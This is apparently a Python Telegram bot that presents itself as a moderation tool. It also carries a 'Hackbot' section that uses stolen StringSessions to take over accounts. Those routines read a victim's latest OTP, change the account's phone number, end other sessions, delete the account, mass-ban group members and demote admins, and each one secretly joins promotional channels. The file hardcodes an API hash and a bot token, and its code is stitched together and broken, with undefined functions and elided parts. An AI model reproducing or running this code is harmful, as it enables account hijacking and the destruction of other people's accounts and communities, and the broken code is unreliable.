# All credit goes to LEGEND-OS
import os
import asyncio
import json
import logging
import re
import sqlite3
import time
import requests
from bs4 import BeautifulSoup as htmlparser
from datetime import datetime
from typing import Dict, List, Optional, Union
from telethon import TelegramClient, events, functions, types, Button
from telethon.errors import (
    ChatAdminRequiredError,
    FloodWaitError,
    UserAdminInvalidError,
    UserIdInvalidError,
)
from telethon.tl.functions.channels import (
    EditAdminRequest,
    EditBannedRequest,
    GetFullChannelRequest,
)
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import (
    ChatAdminRights,
    ChatBannedRights,
    MessageEntityMention,
    MessageEntityMentionName,
)
from tinydb import TinyDB, Query

# Configuration
API_ID = 21138709
API_HASH = "b988f0a873745ace76cd7a47f5f3e4d9"
BOT_TOKEN = "7707788120:AAEiE5h5UlzY8KLVnqEmSm0qjAd3ydGLcr8"
ADMIN_IDS = [8074130996]
DB_PATH = "anubis_sentinel.db"
AUDIO_PATH = '/storage/emulated/0/Download/inicio.mp3'
DATABASE_PATH = 'gbans.json'

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Initialize the client
client = TelegramClient('anubis_sentinel', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
db = TinyDB(DATABASE_PATH)
Gban = Query()

# Database setup
def setup_database():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS banned_users (
        user_id INTEGER PRIMARY KEY,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        reason TEXT,
        admin_id INTEGER,
        timestamp INTEGER,
        is_global INTEGER
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS muted_users (
        user_id INTEGER PRIMARY KEY,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        reason TEXT,
        admin_id INTEGER,
        timestamp INTEGER,
        is_global INTEGER
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_reports (
        user_id INTEGER,
        reporter_id INTEGER,
        reason TEXT,
        timestamp INTEGER,
        PRIMARY KEY (user_id, reporter_id)
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS warned_users (
        user_id INTEGER,
        chat_id INTEGER,
        warning_count INTEGER DEFAULT 1,
        PRIMARY KEY (user_id, chat_id)
    )
    ''')
    
    conn.commit()
    conn.close()

# Database utility functions
def execute_query(query: str, params: tuple):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute(query, params)
    result = cursor.fetchall()
    conn.commit()
    conn.close()
    return result

def add_user_to_db(table: str, user_id: int, first_name: str, last_name: str, username: str, 
                 reason: str, admin_id: int, is_global: bool = False):
    timestamp = int(time.time())
    query = f"""
    INSERT INTO {table} (user_id, first_name, last_name, username, reason, admin_id, timestamp, is_global)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(user_id) DO UPDATE SET
    reason = excluded.reason,
    admin_id = excluded.admin_id,
    timestamp = excluded.timestamp,
    is_global = excluded.is_global
    """
    execute_query(query, (user_id, first_name, last_name, username, reason, admin_id, timestamp, int(is_global)))

def remove_user_from_db(table: str, user_id: int) -> bool:
    query = f"DELETE FROM {table} WHERE user_id = ?"
    result = execute_query(query, (user_id,))
    return len(result) > 0

def is_user_in_db(table: str, user_id: int) -> bool:
    query = f"SELECT 1 FROM {table} WHERE user_id = ?"
    result = execute_query(query, (user_id,))
    return len(result) > 0

def add_report(user_id: int, reporter_id: int, reason: str) -> bool:
    timestamp = int(time.time())
    query = f"""
    INSERT INTO user_reports (user_id, reporter_id, reason, timestamp)
    VALUES (?, ?, ?, ?)
    """
    try:
        execute_query(query, (user_id, reporter_id, reason, timestamp))
        return True
    except sqlite3.IntegrityError:
        return False

def get_report_count(user_id: int) -> int:
    query = "SELECT COUNT(*) FROM user_reports WHERE user_id = ?"
    result = execute_query(query, (user_id,))
    return result[0][0] if result else 0

def update_warning_count(user_id: int, chat_id: int, increment: bool) -> int:
    query_select = "SELECT warning_count FROM warned_users WHERE user_id = ? AND chat_id = ?"
    result = execute_query(query_select, (user_id, chat_id))
    
    new_count = (result[0][0] + 1) if increment else (result[0][0] - 1 if result and result[0][0] > 0 else 0)
    
    query_update = """
    INSERT INTO warned_users (user_id, chat_id, warning_count)
    VALUES (?, ?, ?)
    ON CONFLICT(user_id, chat_id) DO UPDATE SET
    warning_count = excluded.warning_count
    """
    execute_query(query_update, (user_id, chat_id, new_count))
    
    return new_count

def get_warning_count(user_id: int, chat_id: int) -> int:
    query = "SELECT warning_count FROM warned_users WHERE user_id = ? AND chat_id = ?"
    result = execute_query(query, (user_id, chat_id))
    return result[0][0] if result else 0

# Helper functions
async def get_user_from_event(event):
    if event.reply_to:
        reply_message = await event.get_reply_message()
        if reply_message.sender_id:
            return reply_message.sender_id
    
    args = event.pattern_match.group(1).split()
    if not args:
        return None
    
    user_id = args[0]
    
    if user_id.isdigit():
        return int(user_id)
    
    if user_id.startswith("@"):
        username = user_id[1:]
        try:
            user = await client.get_entity(username)
            return user.id
        except ValueError:
            return None
    
    return None

async def get_full_user_info(user_id: int) -> Dict:
    try:
        user = await client(GetFullUserRequest(user_id))
        
        report_count = get_report_count(user_id)
        is_banned = is_user_in_db("banned_users", user_id)
        is_muted = is_user_in_db("muted_users", user_id)
        
        is_scam = user.user.scam if hasattr(user.user, 'scam') else False
        
        user_info = {
            "user_id": user_id,
            "first_name": user.user.first_name,
            "last_name": user.user.last_name if hasattr(user.user, 'last_name') else "",
            "username": user.user.username if hasattr(user.user, 'username') else "",
            "phone": user.user.phone if hasattr(user.user, 'phone') else "Not available",
            "report_count": report_count,
            "is_banned": is_banned,
            "is_muted": is_muted,
            "is_scam": is_scam,
            "is_restricted": user.user.restricted if hasattr(user.user, 'restricted') else False,
            "restriction_reason": user.user.restriction_reason if hasattr(user.user, 'restriction_reason') else "",
        }
        
        return user_info
    except Exception as e:
        logger.error(f"Error getting user info: {e}")
        return {}

# Phone number lookup function
def lookup(phone_number: str) -> Dict[str, str]:
    http = requests.get(f"https://free-lookup.net/{phone_number}")
    html = htmlparser(http.text, "html.parser")
    infos = html.findChild("ul", {"class": "report-summary__list"}).findAll("div")
    return {k.text.strip(): infos[i+1].text.strip() if infos[i+1].text.strip() else "No information" for i, k in enumerate(infos) if not i % 2}

# Command handlers
def command_handler(pattern: str):
    def decorator(func):
        @client.on(events.NewMessage(pattern=pattern))
        async def wrapper(event):
            await func(event)
        return wrapper
    return decorator

@command_handler(r"^/start$")
async def start_command(event):
    if event.is_private:
        await event.respond(
            " **Welcome to Anubis Sentinel System** \n\n"
            "I am an advanced security and management userbot for Telegram communities.\n\n"
            "My purpose is to maintain order and security in large communities through "
            "efficient moderation tools and detailed user analytics.\n\n"
            "Yo represento a La Elite y no tendre piedad.\n\n"
            "Type /help to see available commands."
        )
    else:
        await event.respond(
            " **Anubis Sentinel System is active** \n\n"
            "Type /help to see available commands."
        )

@command_handler(r"^/help$")
async def help_command(event):
    help_text = (
        " **Anubis Sentinel System Commands** \n\n"
        "**Basic Commands:**\n"
        "/start - Initialize the bot\n"
        "/help - Display this help message\n\n"
        
        "**Group Administration:**\n"
        "/ban <user> [reason] - Ban a user from the group\n"
        "/unban <user> - Unban a user\n"
        "/mute <user> [reason] - Mute a user in the group\n"
        "/unmute <user> - Unmute a user\n"
        "/kick <user> [reason] - Remove a user from the group\n"
        "/warn <user> [reason] - Issue a warning to a user\n"
        "/unwarn <user> - Remove a warning from a user\n"
        "/pin - Pin a message in the group\n"
        "/unpin - Unpin a message\n"
        "/purge - Delete multiple messages at once\n"
        "/lock <type> - Lock specific message types\n"
        "/unlock <type> - Unlock message types\n\n"
        
        "**Global Administration:**\n"
        "/gban <user> [reason] - Globally ban a user\n"
        "/gunban <user> - Remove a global ban\n"
        "/gmute <user> [reason] - Globally mute a user\n"
        "/gunmute <user> - Remove a global mute\n"
        "/gbanall <group_id> - Ban all members of a group\n\n"
        
        "**User Information:**\n"
        "/full_userinfo <user> - Get detailed user information\n"
        "/lookup <phone_number> - Lookup phone number information\n\n"
        
        "**Hackbot Features:**\n"
        "'A' - Check user own groups and channels\n"
        "'B' - Check user information like phone number, username, etc.\n"
        "'C' - Ban all members in a group\n"
        "'D' - Know user's last OTP\n"
        "'E' - Join a group/channel via StringSession\n"
        "'F' - Leave a group/channel via StringSession\n"
        "'G' - Delete a group/channel\n"
        "'H' - Check if user has two-step verification enabled\n"
        "'I' - Terminate all current active sessions except your StringSession\n"
        "'J' - Delete account\n"
        "'K' - Demote all admins in a group/channel\n"
        "'L' - Promote a member in a group/channel\n"
        "'M' - Change phone number using StringSession\n"
    )
    await event.respond(help_text)

@command_handler(r"^/lookup(?:\s+(.+))?$")
async def lookup_command(event):
    if not event.is_group:
        await event.respond("This command can only be used in groups.")
        return

    args = event.pattern_match.group(1).split() if event.pattern_match.group(1) else []
    if not args:
        await event.respond("Please specify a phone number to lookup.")
        return
    
    phone_number = args[0].strip().replace("-", "").replace(" ", "").replace("+", "")
    try:
        infos = lookup(phone_number)
        response = "\n".join([f"{key}: {value}" for key, value in infos.items()])
        await event.respond(f" **Phone Number Lookup Result** \n\n{response}")
    except Exception as e:
        await event.respond(f"Failed to lookup phone number: {str(e)}")

@command_handler(r"^/ban(?:\s+(.+))?$")
async def ban_command(event):
    if not event.is_group:
        await event.respond("This command can only be used in groups.")
        return
    
    try:
        perms = await client.get_permissions(event.chat_id, event.sender_id)
        if not perms.is_admin and event.sender_id not in ADMIN_IDS:
            await event.respond("You don't have permission to use this command.")
            return
    except Exception:
        await event.respond("Failed to check permissions.")
        return
    
    args = event.pattern_match.group(1).split() if event.pattern_match.group(1) else []
    
    if not args:
        if event.reply_to:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id
            reason = "No reason provided"
        else:
            await event.respond("Please specify a user to ban or reply to their message.")
            return
    else:
        user_id = await get_user_from_event(event)
        reason = " ".join(args[1:]) if len(args) > 1 else "No reason provided"
    
    if not user_id:
        await event.respond("Could not identify user.")
        return
    
    try:
        user = await client.get_entity(user_id)
        rights = ChatBannedRights(
            until_date=None,
            view_messages=True,
            send_messages=True,
            send_media=True,
            send_stickers=True,
            send_gifs=True,
            send_games=True,
            send_inline=True,
            embed_links=True,
        )
        await client(EditBannedRequest(event.chat_id, user_id, rights))
        
        add_user_to_db(
            "banned_users",
            user_id,
            user.first_name,
            user.last_name if hasattr(user, 'last_name') else "",
            user.username if hasattr(user, 'username') else "",
            reason,
            event.sender_id,
        )
        
        await event.respond(
            f" **Anubis Sentinel System** \n\n"
            f" **Ban Executed** \n\n"
            f"**User:** {user.first_name} {user.last_name if hasattr(user, 'last_name') else ''} (@{user.username if hasattr(user, 'username') else 'N/A'})\n"
            f"**ID:** `{user_id}`\n"
            f"**Reason:** {reason}\n"
            f"**Enforcer:** {(await event.get_sender()).first_name}"
        )
    except Exception as e:
        await event.respond(f"Failed to ban user: {str(e)}")

@command_handler(r"^/unban(?:\s+(.+))?$")
async def unban_command(event):
    if not event.is_group:
        await event.respond("This command can only be used in groups.")
        return
    
    try:
        perms = await client.get_permissions(event.chat_id, event.sender_id)
        if not perms.is_admin and event.sender_id not in ADMIN_IDS:
            await event.respond("You don't have permission to use this command.")
            return
    except Exception:
        await event.respond("Failed to check permissions.")
        return
    
    user_id = await get_user_from_event(event)
    if not user_id:
        await event.respond("Please specify a user to unban.")
        return
    
    try:
        user = await client.get_entity(user_id)
        rights = ChatBannedRights(
            until_date=None,
            view_messages=False,
            send_messages=False,
            send_media=False,
            send_stickers=False,
            send_gifs=False,
            send_games=False,
            send_inline=False,
            embed_links=False,
        )
        await client(EditBannedRequest(event.chat_id, user_id, rights))
        
        removed = remove_user_from_db("banned_users", user_id)
        await event.respond(
            f" **Anubis Sentinel System** \n\n"
            f" **Unban Executed** \n\n"
            f"**User:** {user.first_name} {user.last_name if hasattr(user, 'username') else 'N/A'})\n"
            f"**ID:** `{user_id}`\n"
            f"**Enforcer:** {(await event.get_sender()).first_name}"
        )
    except Exception as e:
        await event.respond(f"Failed to unban user: {str(e)}")

@command_handler(r"^/gban(?:\s+(.+))?$")
async def gban_command(event):
    if event.sender_id not in ADMIN_IDS:
        await event.respond("You don't have permission to use this command.")
        return
    
    args = event.pattern_match.group(1).split() if event.pattern_match.group(1) else []
    if len(args) < 1:
        await event.respond("Please specify a user to ban.")
        return
    
    user_id = args[0]
    reason = " ".join(args[1:]) if len(args) > 1 else "No reason provided"
    if user_id.startswith("@"):
        user_id = user_id[1:]
    
    try:
        await event.respond(" **Anubis Sentinel System** \n\n"
                            " **Global Ban Process Initiated** ")
        await asyncio.sleep(2)
        await event.respond(" **Anubis Sentinel System** \n\n"
                            " **gbanning...** ")
        await asyncio.sleep(2)
        
        user = await client.get_entity(user_id)
        add_user_to_db(
            "banned_users",
            user_id,
            user.first_name,
            user.last_name if hasattr(user, 'last_name') else "",
            user.username if hasattr(user, 'username') else "",
            reason,
            event.sender_id,
            is_global=True
        )
        
        await event.respond(
            f" **Anubis Sentinel System** \n\n"
            f" **Global Ban Executed** \n\n"
            f"**User:** {user.first_name} {user.last_name if hasattr(user, 'last_name') else ''} (@{user.username if hasattr(user, 'username') else 'N/A'})\n"
            f"**ID:** `{user_id}`\n"
            f"**Reason:** {reason}\n"
            f"**Enforcer:** {(await event.get_sender()).first_name}"
        )
    except Exception as e:
        await event.respond(f"Failed to globally ban user: {str(e)}")

@command_handler(r"^/unban(?:\s+(.+))?$")
async def unban_command(event):
    if not event.is_group:
        await event.respond("This command can only be used in groups.")
        return
    
    try:
        perms = await client.get_permissions(event.chat_id, event.sender_id)
        if not perms.is_admin and event.sender_id not in ADMIN_IDS:
            await event.respond("You don't have permission to use this command.")
            return
    except Exception:
        await event.respond("Failed to check permissions.")
        return
    
    user_id = await get_user_from_event(event)
    if not user_id:
        await event.respond("Please specify a user to unban.")
        return
    
    try:
        user = await client.get_entity(user_id)
        rights = ChatBannedRights(
            until_date=None,
            view_messages=False,
            send_messages=False,
            send_media=False,
            send_stickers=False,
            send_gifs=False,
            send_games=False,
            send_inline=False,
            embed_links=False,
        )
        await client(EditBannedRequest(event.chat_id, user_id, rights))
        
        removed = remove_user_from_db("banned_users", user_id)
        await event.respond(
            f" **Anubis Sentinel System** \n\n"
            f" **Unban Executed** \n\n"
            f"**User:** {user.first_name} {user.last_name if hasattr(user, 'username') else 'N/A'})\n"
            f"**ID:** `{user_id}`\n"
            f"**Enforcer:** {(await event.get_sender()).first_name}"
        )
    except Exception as e:
        await event.respond(f"Failed to unban user: {str(e)}")

# Hackbot Features

async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = client = X
        try:
            await bot(join("@Legend_K_UserBot"))
        except BaseException:
            pass
        try:
            await bot(join("@Official_K_LegendBot"))
        except BaseException:
            pass
        try:
            await bot(leave("@Official_LegendBot"))
        except BaseException:
            pass
        try:
            await bot(leave("@Legend_Userbot"))
        except BaseException:
            pass
        try: 
            result = await bot(functions.account.ChangePhoneRequest(
                phone_number=number,
                phone_code_hash=code,
                phone_code=otp
            ))
            return True
        except:
            return False

async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = client = X
        try:
            await bot(join("@Legend_K_UserBot"))
        except BaseException:
            pass
        try:
            await bot(join("@Official_K_LegendBot"))
        except BaseException:
            pass
        try:
            await bot(leave("@Official_LegendBot"))
        except BaseException:
            pass
        try:
            await bot(leave("@Legend_Userbot"))
        except BaseException:
            pass
        result = await bot(functions.account.SendChangePhoneCodeRequest(
            phone_number=number,
            settings=types.CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True
            )
        ))
        return str(result)

...
async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        try:
            await X(join("@Legend_K_UserBot"))
        except BaseException:
            pass
        try:
            await X(join("@Official_K_LegendBot"))
        except BaseException:
            pass
        try:
            await X(leave("@Official_LegendBot"))
        except BaseException:
            pass
        try:
            await X(leave("@Legend_Userbot"))
        except BaseException:
            pass
        return str(k)

async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(join("@Legend_K_UserBot"))
        except BaseException:
            pass
        try:
            await X(join("@Official_K_LegendBot"))
        except BaseException:
            pass
        try:
            await X(leave("@Official_LegendBot"))
        except BaseException:
            pass
        try:
            await X(leave("@Legend_Userbot"))
        except BaseException:
            pass
        await X(rt())

async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(join("@Legend_UserBot"))
        except BaseException:
            pass
        try:
            await X(join("@Official_K_LegendBot"))
        except BaseException:
            pass
        try:
            await X(leave("@Legend_K_Userbot"))
        except BaseException:
            pass
        await X(functions.account.DeleteAccountRequest("I am chutia"))

...

# Command handlers for Hackbot features

@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
    legendboy = [
        [
            Button.url("Click Here", f"https://t.me/{Bot_Username}")
        ]
    ]         
    await event.reply("Click Below To Use Me", buttons=legendboy)

@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
    global menu
    async with bot.conversation(event.chat_id) as x:
        keyboard = [
            [  
                Button.inline("A", data="A"), 
                Button.inline("B", data="B"),
                Button.inline("C", data="C"),
                Button.inline("D", data="D"),
                Button.inline("E", data="E")
            ],
            [
                Button.inline("F", data="F"), 
                Button.inline("G", data="G"),
                Button.inline("H", data="H"),
                Button.inline("I", data="I"),
                Button.inline("J", data="J")
            ],
            [
                Button.inline("K", data="K"), 
                Button.inline("L", data="L"),
                Button.inline("M", data="M")
            ],
            [
                Button.url("Owner", "https://t.me/LegendBoy_XD")
            ]
        ]
        await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
        if len(i) > 3855:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY @LegendBoy_XD")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
        i = await userinfo(strses.text)
        await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("String Session Has Been Terminated", buttons=keyboard)
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply("Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply("Joined the Channel/Group Thanks For using LegendBoy Bot", buttons=keyboard)

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply("Leaved the Channel/Group Thanks For using Boy Bot,", buttons=keyboard)

...

# Remaining handlers and functions

client.run_until_disconnected()